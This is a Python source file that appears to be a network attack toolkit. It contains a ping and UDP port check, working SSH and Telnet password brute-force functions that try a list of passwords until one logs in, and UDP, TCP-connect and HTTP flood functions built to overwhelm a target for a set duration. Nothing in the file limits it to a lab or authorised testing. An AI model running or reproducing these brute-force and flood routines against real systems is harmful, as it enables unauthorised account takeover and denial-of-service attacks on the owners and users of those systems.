import paramiko
import asyncio
import telnetlib3
import time
import socket
import random
import platform
import subprocess

def check_target(target, port):
    """
    Analyzes the target to see if it's up and if the port allows traffic.
    Returns a dictionary with status details.
    """
    analysis = {
        "host_status": "DOWN",
        "port_status": "UNKNOWN",
        "firewall_detected": False,
        "message": ""
    }
    
    # 1. Ping Check (Host Reachability)
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', target]
    
    try:
        response = subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if response == 0:
            analysis["host_status"] = "UP"
        else:
            analysis["host_status"] = "DOWN (or ignoring ICMP)"
            analysis["firewall_detected"] = True
    except Exception:
        pass
        
    # 2. Port Check (Simple Connectivity)
    # For UDP, it's hard to know if it's open without an application response, 
    # but we can check if it's explicitly rejected (ICMP Unreachable)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        sock.sendto(b'test', (target, int(port)))
        
        # In UDP, we might not get anything back even if open. 
        # But if we get a connection refused/unreachable error, it's closed/rejected.
        try:
             data, _ = sock.recvfrom(1024)
             analysis["port_status"] = "OPEN (Responding)"
        except socket.timeout:
             if analysis["host_status"] == "UP":
                 analysis["port_status"] = "OPEN|FILTERED (No Response)"
             else:
                 analysis["port_status"] = "UNKNOWN"
        except ConnectionRefusedError:
             analysis["port_status"] = "CLOSED (Refused)"
             
        sock.close()
    except Exception as e:
        analysis["message"] = str(e)
        
    return analysis

def brute_force_ssh(target, username, password_list, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            client.connect(target, port=port, username=username, password=password, timeout=3)
            # If successful
            success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
            results.append({"status": "success", "password": password, "message": success_msg})
            client.close()
            return results # Stop after finding one
        except paramiko.AuthenticationException:
            # results.append({"status": "fail", "password": password, "message": "Authentication failed"})
            pass
        except Exception as e:
            # Log connection errors for debugging
            print(f"[ERROR] SSH Connection failed: {e}")
            pass
            
    client.close()
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results

async def telnet_login_check(target, port, username, password):
    try:
        reader, writer = await asyncio.wait_for(telnetlib3.open_connection(target, port), timeout=5)
        
        # Read initial banner until login prompt
        # Note: Prompts vary, some systems send "Login:" others "login:"
        await asyncio.wait_for(reader.readuntil("ogin:"), timeout=5) 
        writer.write(username + "\n")
        
        # Read until password
        await asyncio.wait_for(reader.readuntil("assword:"), timeout=5)
        writer.write(password + "\n")
        
        # Check result
        # Read a bit to see if we get a shell prompt or error
        response = await asyncio.wait_for(reader.read(1024), timeout=5)
        
        writer.close()
        
        if "Login incorrect" not in response and "failed" not in response:
            return True
        return False
    except Exception as e:
        # print(f"Telnet Error: {e}")
        return False

def brute_force_telnet(target, username, password_list, port=23):
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            # Create a new event loop for each attempt to avoid "loop is closed" issues in this sync function context
            # Or just use asyncio.run which handles a fresh loop
            is_success = asyncio.run(telnet_login_check(target, port, username, password))
            
            if is_success:
                 success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
                 results.append({"status": "success", "password": password, "message": success_msg})
                 return results
                 
        except Exception as e:
            print(f"Telnet Attempt Error: {e}")
            pass
            
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results

def udp_flood(target, port, duration, packet_size=1024):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Generate random payload of specified size
    bytes_to_send = random._urandom(min(packet_size, 65500)) 
    timeout = time.time() + duration
    sent = 0

    try:
        while time.time() < timeout:
            client.sendto(bytes_to_send, (target, port))
            sent += 1
            
        return {"status": "success", "message": f"UDP Flood finished. Sent {sent} packets ({packet_size} bytes each) to {target}:{port} in {duration}s."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def tcp_flood(target, port, duration):
    """
    Simulates a TCP Connect Flood. 
    Rapidly opens connections to the target to exhaust its connection table.
    """
    timeout = time.time() + duration
    sent = 0
    
    try:
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.close()
                sent += 1
            except:
                pass
                
        return {"status": "success", "message": f"TCP Flood finished. Attempted {sent} connections to {target}:{port} in {duration}s."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def http_flood(target, port, duration):
    """
    Simulates an HTTP Flood (Layer 7).
    Sends rapid GET requests to the target web server.
    """
    timeout = time.time() + duration
    sent = 0
    payload = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nConnection: keep-alive\r\n\r\n".encode()
    
    try:
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.sendall(payload)
                s.close()
                sent += 1
            except:
                pass
                
        return {"status": "success", "message": f"HTTP Flood finished. Sent {sent} requests to {target}:{port} in {duration}s."}
    except Exception as e:
        return {"status": "error", "message": str(e)}
